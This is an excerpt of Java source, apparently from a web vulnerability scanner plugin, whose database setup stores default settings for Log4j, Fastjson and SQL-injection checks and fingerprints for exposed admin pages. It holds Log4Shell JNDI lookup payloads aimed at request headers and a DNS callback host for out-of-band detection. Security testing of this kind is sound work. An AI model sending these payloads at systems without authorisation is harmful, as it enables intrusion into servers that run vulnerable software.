...
public class DbUtils {
    ...
    public static void create() {
        ...
        try {
            ...
            sqls.add("CREATE TABLE \"config\" ( \"id\" INTEGER, \"module\" TEXT, \"type\" TEXT, \"value\" TEXT, PRIMARY KEY (\"id\"), UNIQUE (\"type\" ASC) );");
            ...
            sqls.add("INSERT INTO \"config\" VALUES (4, 'config', 'dnslog', '48in.callback.red');");
            ...
            sqls.add("CREATE TABLE \"fastjson\" ( \"id\" INTEGER, \"type\" TEXT, \"url\" TEXT, PRIMARY KEY (\"id\") );");
            ...
            sqls.add("CREATE TABLE \"log4j\" ( \"id\" INTEGER, \"type\" TEXT, \"value\" TEXT, PRIMARY KEY (\"id\") );");
            sqls.add("INSERT INTO \"log4j\" VALUES (37, 'log4jPassiveScan', 'false');");
            sqls.add("INSERT INTO \"log4j\" VALUES (38, 'log4jOrginValue', 'true');");
            sqls.add("INSERT INTO \"log4j\" VALUES (39, 'log4jCheckHeader', 'false');");
            sqls.add("INSERT INTO \"log4j\" VALUES (40, 'log4jCheckParam', 'false');");
            sqls.add("INSERT INTO \"log4j\" VALUES (41, 'log4jIsDnsOrIp', 'false');");
            sqls.add("INSERT INTO \"log4j\" VALUES (42, 'log4jCheckWhiteList', 'false');");
            sqls.add("INSERT INTO \"log4j\" VALUES (58, 'domain', 'www.baidu.com');");
            sqls.add("INSERT INTO \"log4j\" VALUES (59, 'domain', 'www.qq.com');");
            sqls.add("INSERT INTO \"log4j\" VALUES (60, 'header', 'Cookies');");
            sqls.add("INSERT INTO \"log4j\" VALUES (61, 'header', 'X-Remote-Addr');");
            sqls.add("INSERT INTO \"log4j\" VALUES (62, 'header', 'User-Agent');");
            sqls.add("INSERT INTO \"log4j\" VALUES (63, 'header', 'asdasd');");
            sqls.add("INSERT INTO \"log4j\" VALUES (64, 'payload', '${jndi:ldap://dnslog-url/1}');");
            sqls.add("INSERT INTO \"log4j\" VALUES (65, 'payload', '${jndi:ldap://dnslog-url/2}');");
            sqls.add("INSERT INTO \"log4j\" VALUES (66, 'payload', '${jndi:ldap://dnslog-url/3}');");
            ...
            sqls.add("CREATE TABLE \"route\" ( \"id\" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, \"enable\" integer, \"name\" TEXT, \"path\" TEXT, \"express\" TEXT );");
            sqls.add("INSERT INTO \"route\" VALUES (1, 0, 'Swagger UI', '/swagger-ui.html', 'code=200 && (title=\"Swagger UI\" || body=\"swagger-ui.js\")');");
            sqls.add("INSERT INTO \"route\" VALUES (3, 0, 'Spring Actuator Env', '/actuator/env', 'code=200 && body=\"java.version\" && body=\"os.arch\"');");
            sqls.add("INSERT INTO \"route\" VALUES (4, 1, 'phpinfo', '/phpinfo.php', 'code=200 && body=\"PHP Version\"');");
            sqls.add("INSERT INTO \"route\" VALUES (5, 0, 'nacos', '/nacos/index.html', 'code=200 && body=\"codemirror.addone.fullscreen.js\"');");
            sqls.add("INSERT INTO \"route\" VALUES (6, 0, 'druid', '/druid/login.html', 'code=200 && title=\"druid monitor\"');");
            sqls.add("INSERT INTO \"route\" VALUES (7, 0, 'swagger', '/swagger/Default/swagger.json', 'code=200 && body=\"openapi\"');");
            sqls.add("INSERT INTO \"route\" VALUES (19, 0, '123', '2', '1');");
            sqls.add("CREATE TABLE \"sqli\" ( \"id\" INTEGER, \"type\" TEXT, \"value\" TEXT, PRIMARY KEY (\"id\"));");
            sqls.add("INSERT INTO \"sqli\" VALUES (4, 'sqlPassiveScan', 'false');");
            sqls.add("INSERT INTO \"sqli\" VALUES (5, 'sqlDeleteOrgin', 'true');");
            sqls.add("INSERT INTO \"sqli\" VALUES (6, 'sqlCheckCookie', 'true');");
            sqls.add("INSERT INTO \"sqli\" VALUES (7, 'sqlCheckHeader', 'true');");
            sqls.add("INSERT INTO \"sqli\" VALUES (8, 'sqlWhiteDomain', 'false');");
